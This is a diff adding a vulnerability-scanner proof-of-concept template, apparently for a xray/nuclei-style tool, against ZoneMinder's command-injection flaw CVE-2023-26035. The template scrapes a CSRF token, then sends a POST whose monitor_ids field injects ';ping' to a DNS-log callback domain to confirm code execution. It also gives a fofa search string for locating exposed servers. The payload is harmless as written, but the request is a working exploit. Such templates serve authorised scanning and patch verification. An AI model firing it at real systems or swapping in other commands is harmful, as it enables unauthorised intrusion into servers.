@@ -1,0 +1,28 @@
+id: poc-yaml-zoneminder-rce
+info:
+  name: ZoneMinder 命令注入漏洞(CVE-2023-26035)
+  severity: critical
+  tags:
+  - DNSLOG
+  - 命令注入
+  - CVE-2023-26035
+  finger: zoneminder
+  fofa: body="ZoneMinder Login"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /index.php
+  expression: 'status_code == 200
+
+    '
+  output:
+  - regex_match(body,`csrfMagicToken = "(?P<csrfMagicToken>.*?)"`)
+- method: POST
+  path: /index.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: view=snapshot&action=create&monitor_ids[0][Id]=;ping+{{.reverseDomain}}&__csrf_magic={{.csrfMagicToken}}
+  expression: reverse.Verify()
+transport: http
